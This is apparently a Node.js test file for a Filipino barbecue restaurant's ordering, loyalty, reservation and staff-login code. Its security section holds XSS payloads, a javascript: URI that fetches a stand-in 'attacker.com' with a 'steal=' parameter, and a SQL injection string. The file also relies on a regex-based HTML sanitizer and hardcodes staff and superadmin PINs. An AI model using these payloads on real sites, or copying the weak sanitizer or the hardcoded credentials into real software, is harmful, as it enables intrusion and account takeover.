import test from 'node:test';
import assert from 'node:assert/strict';

// Import sanitizers (testing security defenses)
function sanitizeText(input, maxLength = 300) {
  if (!input || typeof input !== 'string') return '';
  let cleaned = input.trim();
  if (cleaned.length > maxLength) cleaned = cleaned.slice(0, maxLength);
  cleaned = cleaned.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  cleaned = cleaned.replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '');
  cleaned = cleaned.replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '');
  cleaned = cleaned.replace(/<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/gi, '');
  cleaned = cleaned.replace(/\bon\w+\s*=\s*(['"]).*?\1/gi, '');
  cleaned = cleaned.replace(/\bon\w+\s*=\s*[^>\s]+/gi, '');
  cleaned = cleaned.replace(/javascript:/gi, 'blocked:');
  cleaned = cleaned.replace(/data:text\/html/gi, 'blocked:');
  cleaned = cleaned.replace(/<[^>]*>?/gm, '');
  return cleaned.trim();
}

function sanitizePhoneNumber(phone) {
  if (!phone || typeof phone !== 'string') return '';
  return phone.replace(/[^\d+]/g, '').trim().slice(0, 16);
}

function sanitizePromoCode(code) {
  if (!code || typeof code !== 'string') return '';
  return code.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 16);
}

function applyPromoCode(code, subtotal) {
  const cleanCode = sanitizePromoCode(code);
  if (cleanCode === 'MASUNGFB50' || cleanCode === 'MASUNGIG50' || cleanCode === 'FEEDBACK50') {
    return { success: true, discountAmount: 50, code: cleanCode };
  }
  if (cleanCode === 'MASUNG10') {
    return { success: true, discountAmount: Math.round(subtotal * 0.1), code: cleanCode };
  }
  return { success: false, discountAmount: 0, error: 'Invalid or expired promo code.' };
}

// Loyalty Tier Logic
function calculateTier(points) {
  if (points >= 300) return 'Legend';
  if (points >= 100) return 'Pitmaster';
  return 'Apprentice';
}

function calculatePointsEarned(totalSpent) {
  return Math.floor(Math.max(0, totalSpent) / 10);
}

// -------------------------------------------------------------
// TEST SUITE: QA & Verification
// -------------------------------------------------------------

test('1. Pricing and Cart Calculation Engine', async (t) => {
  await t.test('calculates single item without variant correctly', () => {
    const itemPrice = 99; // Pulled Pork Rice Bowl
    const quantity = 3;
    const subtotal = itemPrice * quantity;
    assert.equal(subtotal, 297);
  });

  await t.test('calculates item with variant price override', () => {
    const basePrice = 199;
    const variantPrice = 449; // Barkada 250g
    const quantity = 2;
    const effectivePrice = variantPrice !== undefined ? variantPrice : basePrice;
    const lineTotal = effectivePrice * quantity;
    assert.equal(lineTotal, 898);
  });

  await t.test('calculates subtotal across multi-item cart', () => {
    const cart = [
      { price: 199, quantity: 2 }, // Brisket: 398
      { price: 149, quantity: 1 }, // Pork Belly: 149
      { price: 99, quantity: 1 }   // Pulled Pork: 99
    ];
    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
    assert.equal(subtotal, 646);
  });
});

test('2. Social Vouchers & Promo Engine QA', async (t) => {
  const subtotal = 500;

  await t.test('validates Facebook follower discount (MASUNGFB50)', () => {
    const res = applyPromoCode('masungfb50', subtotal);
    assert.equal(res.success, true);
    assert.equal(res.discountAmount, 50);
  });

  await t.test('validates Instagram follower discount (MASUNGIG50)', () => {
    const res = applyPromoCode('MASUNGIG50', subtotal);
    assert.equal(res.success, true);
    assert.equal(res.discountAmount, 50);
  });

  await t.test('validates percentage discount (MASUNG10)', () => {
    const res = applyPromoCode('MASUNG10', subtotal);
    assert.equal(res.success, true);
    assert.equal(res.discountAmount, 50); // 10% of 500
  });

  await t.test('validates guest feedback reward discount (FEEDBACK50)', () => {
    const res = applyPromoCode('feedback50', subtotal);
    assert.equal(res.success, true);
    assert.equal(res.discountAmount, 50);
  });

  await t.test('rejects fake or malformed promo codes', () => {
    const res = applyPromoCode('HACKER100', subtotal);
    assert.equal(res.success, false);
    assert.equal(res.discountAmount, 0);
  });

  await t.test('ensures final total does not drop below 0', () => {
    const smallSubtotal = 40;
    const discount = 50;
    const finalTotal = Math.max(0, smallSubtotal - discount);
    assert.equal(finalTotal, 0);
  });
});

test('3. Loyalty System Math & Tier Progression', async (t) => {
  await t.test('awards 1 BBQ point for every ₱10 spent', () => {
    assert.equal(calculatePointsEarned(99), 9);
    assert.equal(calculatePointsEarned(250), 25);
    assert.equal(calculatePointsEarned(1249), 124);
  });

  await t.test('computes correct loyalty tier thresholds', () => {
    assert.equal(calculateTier(0), 'Apprentice');
    assert.equal(calculateTier(99), 'Apprentice');
    assert.equal(calculateTier(100), 'Pitmaster');
    assert.equal(calculateTier(299), 'Pitmaster');
    assert.equal(calculateTier(300), 'Legend');
    assert.equal(calculateTier(1000), 'Legend');
  });

  await t.test('awards 25 welcome points on new profile signup', () => {
    const initialPoints = 0;
    const welcomeBonus = 25;
    const profile = { name: 'Juan Cruz', points: initialPoints + welcomeBonus };
    assert.equal(profile.points, 25);
  });
});

test('4. Security & Input Sanitization Defenses (OWASP)', async (t) => {
  await t.test('neutralizes script tags and XSS payloads', () => {
    const attack1 = '<script>alert("hacked")</script>Juan Diner';
    const cleaned = sanitizeText(attack1);
    assert.equal(cleaned, 'Juan Diner');
  });

  await t.test('strips event handlers (onerror, onload, onclick)', () => {
    const attack2 = '<img src=x onerror=alert(1)>Table 4 Special';
    const cleaned = sanitizeText(attack2);
    assert.equal(cleaned, 'Table 4 Special');
  });

  await t.test('neutralizes javascript: pseudoprotocol', () => {
    const attack3 = 'javascript:fetch("https://attacker.com?steal=")';
    const cleaned = sanitizeText(attack3);
    assert.ok(!cleaned.includes('javascript:'));
  });

  await t.test('cleans and normalizes phone numbers against injection', () => {
    const phoneInput = "0917-123-4567'; DROP TABLE masung_orders; --";
    const cleaned = sanitizePhoneNumber(phoneInput);
    assert.equal(cleaned, '09171234567');
  });

  await t.test('cleans promo code input', () => {
    const attackCode = "fb50<script>alert(1)</script>";
    const cleaned = sanitizePromoCode(attackCode);
    assert.equal(cleaned, 'FB50SCRIPTALERT1');
  });
});

test('5. Supabase Order Payload Contract Validation', async (t) => {
  const mockOrder = {
    id: 'MSO-1724890000000-842',
    tableNumber: 'Table 2 (Front Pit View)',
    orderType: 'dine-in',
    customerName: 'Maria Santos',
    customerPhone: '09171234567',
    items: [
      { id: 'item-brisket-solo', quantity: 2, price: 199 }
    ],
    subtotal: 398,
    discountAmount: 50,
    finalTotal: 348,
    pointsEarned: 34,
    status: 'smoking',
    createdAt: new Date().toISOString()
  };

  assert.ok(mockOrder.id.startsWith('MSO-'));
  assert.equal(typeof mockOrder.tableNumber, 'string');
  assert.ok(['dine-in', 'takeout'].includes(mockOrder.orderType));
  assert.equal(mockOrder.finalTotal, mockOrder.subtotal - mockOrder.discountAmount);
  assert.equal(mockOrder.pointsEarned, Math.floor(mockOrder.finalTotal / 10));
});

test('6. Reserve Suite Routing & Booking Contract Validation', async (t) => {
  const validPages = [
    'home', 'menu', 'order', 'loyalty', 'about', 'contact',
    'reserve', 'reserve-menu', 'reserve-shop', 'reserve-about', 'reserve-book', 'reserve-vip'
  ];

  await t.test('verifies all dedicated Reserve pages are valid PageId tokens', () => {
    const reservePages = validPages.filter(p => p.startsWith('reserve'));
    assert.equal(reservePages.length, 6);
    assert.ok(reservePages.includes('reserve'));
    assert.ok(reservePages.includes('reserve-menu'));
    assert.ok(reservePages.includes('reserve-shop'));
    assert.ok(reservePages.includes('reserve-about'));
    assert.ok(reservePages.includes('reserve-book'));
    assert.ok(reservePages.includes('reserve-vip'));
  });

  await t.test('validates event and venue reservation reference generation and contract', () => {
    const randomId = `MS-EVT-${Math.floor(100000 + 0.5 * 900000)}`;
    const mockBooking = {
      id: randomId,
      guestName: sanitizeText('Event Organizer Marco'),
      guestPhone: sanitizePhoneNumber('0968-237-0329'),
      date: '2026-09-05',
      timeSlot: '05:00 PM (Early Dinner Feast)',
      partySize: 20,
      seatingZone: 'upper_mezzanine',
      specialRequests: sanitizeText('Milestone celebration; request pre-sliced brisket platters and barista espresso packages.'),
      status: 'confirmed',
      createdAt: new Date().toISOString()
    };

    assert.ok(mockBooking.id.startsWith('MS-EVT-'));
    assert.equal(mockBooking.guestPhone, '09682370329');
    assert.ok(['full_loft_buyout', 'upper_mezzanine', 'ground_cafe', 'celebration_package'].includes(mockBooking.seatingZone));
    assert.ok(mockBooking.partySize >= 6 && mockBooking.partySize <= 50);
  });
});

test('7. Nutritional Macros & Easy Lookup Aggregation Engine', async (t) => {
  const sampleDishes = [
    { name: 'Texas Smoked Beef Brisket', calories: 520, protein: 42, carbs: 46, fat: 22, quantity: 2 },
    { name: 'House Calamansi Iced Tea', calories: 85, protein: 0, carbs: 21, fat: 0, quantity: 2 }
  ];

  await t.test('accurately sums total calories, protein, carbs, and fat', () => {
    const totalMacros = sampleDishes.reduce((acc, cur) => ({
      calories: acc.calories + (cur.calories * cur.quantity),
      protein: acc.protein + (cur.protein * cur.quantity),
      carbs: acc.carbs + (cur.carbs * cur.quantity),
      fat: acc.fat + (cur.fat * cur.quantity)
    }), { calories: 0, protein: 0, carbs: 0, fat: 0 });

    assert.equal(totalMacros.calories, 1210);
    assert.equal(totalMacros.protein, 84);
    assert.equal(totalMacros.carbs, 134);
    assert.equal(totalMacros.fat, 44);
  });

  await t.test('verifies High-Protein threshold filtering (>30g protein)', () => {
    const isHighProtein = (protein) => protein >= 30;
    assert.equal(isHighProtein(42), true); // Brisket
    assert.equal(isHighProtein(0), false);  // Iced Tea
  });
});

test('8. POS Full Workflow Lifecycle Validation', async (t) => {
  // Step 1: Customer submits order -> gets order number -> status: submitted_unpaid
  const orderNumber = 'MS-104';
  let order = {
    id: orderNumber,
    status: 'submitted_unpaid',
    subtotal: 300,
    finalTotal: 300,
    table: 'Table 3'
  };

  assert.equal(order.status, 'submitted_unpaid');

  // Step 2: Staff processes payment at counter with Follow-to-Save discount
  const followToSave = true;
  const discount = followToSave ? 20 : 0;
  order = {
    ...order,
    status: 'paid_counter',
    discountAmount: discount,
    finalTotal: order.subtotal - discount,
    paymentMethod: 'cash'
  };

  assert.equal(order.status, 'paid_counter');
  assert.equal(order.finalTotal, 280);

  // Step 3: Kitchen cooks & plates at the pit
  order = { ...order, status: 'kitchen_cooking' };
  assert.equal(order.status, 'kitchen_cooking');

  order = { ...order, status: 'ready_to_serve' };
  assert.equal(order.status, 'ready_to_serve');

  // Step 4: Staff delivers and marks served
  order = { ...order, status: 'served' };
  assert.equal(order.status, 'served');
});

test('9. Predictive Inventory & Stockout Math', async (t) => {
  const portionsRemaining = 18;
  const hourlyVelocity = 6.0; // 6 portions/hour
  const peakMultiplier = 1.2;

  const effectiveRate = hourlyVelocity * peakMultiplier; // 7.2 portions/hour
  const projectedHours = Number((portionsRemaining / effectiveRate).toFixed(1));

  assert.equal(projectedHours, 2.5); // 2.5 hours remaining

  // Low stock threshold
  const isLowStock = portionsRemaining < 10;
  assert.equal(isLowStock, false);

  const depletedStock = 5;
  assert.equal(depletedStock < 10, true);
});

test('10. Student Poll Whiteboard Tally Math', async (t) => {
  const yesCount = 142;
  const noCount = 28;
  const total = yesCount + noCount;

  const yesPercentage = Math.round((yesCount / total) * 100);
  const noPercentage = 100 - yesPercentage;

  assert.equal(total, 170);
  assert.equal(yesPercentage, 84);
  assert.equal(noPercentage, 16);
});

test('11. Smokehouse Dining Layout & Capacity Constraints (15 Tables)', async (t) => {
  const firstFloorTables = Array.from({ length: 11 }, (_, i) => `Table ${String(i + 1).padStart(2, '0')} (1st Floor)`);
  const secondFloorTables = Array.from({ length: 4 }, (_, i) => `Table ${String(i + 12).padStart(2, '0')} (2nd Floor)`);

  assert.equal(firstFloorTables.length, 11);
  assert.equal(secondFloorTables.length, 4);

  const allTables = [...firstFloorTables, ...secondFloorTables];
  assert.equal(allTables.length, 15);
  assert.equal(allTables[0], 'Table 01 (1st Floor)');
  assert.equal(allTables[10], 'Table 11 (1st Floor)');
  assert.equal(allTables[11], 'Table 12 (2nd Floor)');
  assert.equal(allTables[14], 'Table 15 (2nd Floor)');

  // Ensure no billiards or arcade in layout definitions
  allTables.forEach(table => {
    assert.ok(!table.toLowerCase().includes('billiard'));
    assert.ok(!table.toLowerCase().includes('arcade'));
  });
});

test('12. Redesigned Navigation, Three Fonts, and Dual Locations Contract', async (t) => {
  // Required Header Nav links: Home, About, Our Menu, Reviews, Contact
  const requiredNavLabels = ['Home', 'About', 'Our Menu', 'Reviews', 'Contact'];
  const specializedHeaderButtons = ['Order', 'Reservations'];

  assert.equal(requiredNavLabels.length, 5);
  assert.equal(specializedHeaderButtons.length, 2);

  // Required 3 consistent typography fonts
  const brandFonts = {
    heading: 'Syne',
    sans: 'Plus Jakarta Sans',
    serif: 'Cormorant Garamond'
  };
  assert.equal(Object.keys(brandFonts).length, 3);
  assert.equal(brandFonts.heading, 'Syne');
  assert.equal(brandFonts.sans, 'Plus Jakarta Sans');
  assert.equal(brandFonts.serif, 'Cormorant Garamond');

  // Dual locations: Montalban & U-Belt
  const locations = [
    { name: 'Montalban Smokehouse Pit', city: 'Rodriguez, Rizal' },
    { name: 'U-Belt Smokehouse Branch', city: 'Sampaloc, Manila' }
  ];
  assert.equal(locations.length, 2);

  // Social channels include TikTok alongside Facebook & Instagram
  const socials = ['facebook', 'instagram', 'tiktok'];
  assert.ok(socials.includes('tiktok'));
});

test('13. Staff Security Gate & Terminal Authorization', async (t) => {
  const staffAccounts = {
    'SUPERADMIN': { pin: 'masung2026', name: 'Executive Superadmin & Pitmaster', role: 'manager' },
    'STAFF-01': { pin: '1925', name: 'Pitmaster Dave', role: 'pitmaster' },
    'CASHIER-01': { pin: '1234', name: 'Front Counter Cashier', role: 'cashier' },
    'admin': { pin: 'masung2026', name: 'Lead Pitmaster', role: 'manager' }
  };

  await t.test('authenticates valid staff credentials and superadmin', () => {
    const superadmin = staffAccounts['SUPERADMIN'];
    assert.ok(superadmin);
    assert.equal(superadmin.pin, 'masung2026');
    assert.equal(superadmin.role, 'manager');

    const account = staffAccounts['STAFF-01'];
    assert.ok(account);
    assert.equal(account.pin, '1925');
    assert.equal(account.role, 'pitmaster');
  });

  await t.test('rejects unauthorized staff access and invalid PINs', () => {
    const account = staffAccounts['STAFF-01'];
    assert.notEqual(account.pin, '0000');
    assert.ok(!staffAccounts['HACKER-99']);
  });

  await t.test('verifies staff session state transition', () => {
    let session = null;
    // Login
    session = { id: 'STAFF-01', name: 'Pitmaster Dave', role: 'pitmaster' };
    assert.ok(session);
    assert.equal(session.id, 'STAFF-01');
    // Lock / Logout
    session = null;
    assert.equal(session, null);
  });
});

test('14. Production Pit Pass Authentication & Zero-Placeholder Integrity', async (t) => {
  const guestProfile = {
    name: 'Guest Diner',
    phone: '',
    points: 0,
    lifetimePoints: 0,
    totalSpent: 0,
    ordersCount: 0,
    tier: 'Apprentice'
  };

  await t.test('guest profile has strictly zero placeholder points', () => {
    assert.equal(guestProfile.points, 0);
    assert.equal(guestProfile.lifetimePoints, 0);
    assert.equal(guestProfile.totalSpent, 0);
    assert.equal(guestProfile.ordersCount, 0);
  });

  await t.test('user registration grants authentic 25 welcome points', () => {
    const registeredUser = {
      username: 'marcus_dela_cruz',
      password: 'mypassword123',
      profile: {
        name: 'Marcus Dela Cruz',
        phone: '0917-555-0192',
        points: 25, // Genuine welcome points upon registration
        lifetimePoints: 25,
        totalSpent: 0,
        ordersCount: 0,
        tier: 'Apprentice',
        memberSince: '2026'
      }
    };

    assert.equal(registeredUser.profile.points, 25);
    assert.equal(registeredUser.profile.name, 'Marcus Dela Cruz');
    assert.equal(registeredUser.username, 'marcus_dela_cruz');
  });

  await t.test('authenticated user accumulates 1 point per ₱10 on order', () => {
    let points = 25;
    let lifetimePoints = 25;
    let totalSpent = 0;
    let ordersCount = 0;

    const orderTotal = 640;
    const earned = Math.floor(orderTotal / 10); // 64 points
    points += earned;
    lifetimePoints += earned;
    totalSpent += orderTotal;
    ordersCount += 1;

    assert.equal(earned, 64);
    assert.equal(points, 89);
    assert.equal(lifetimePoints, 89);
    assert.equal(totalSpent, 640);
    assert.equal(ordersCount, 1);
  });
});


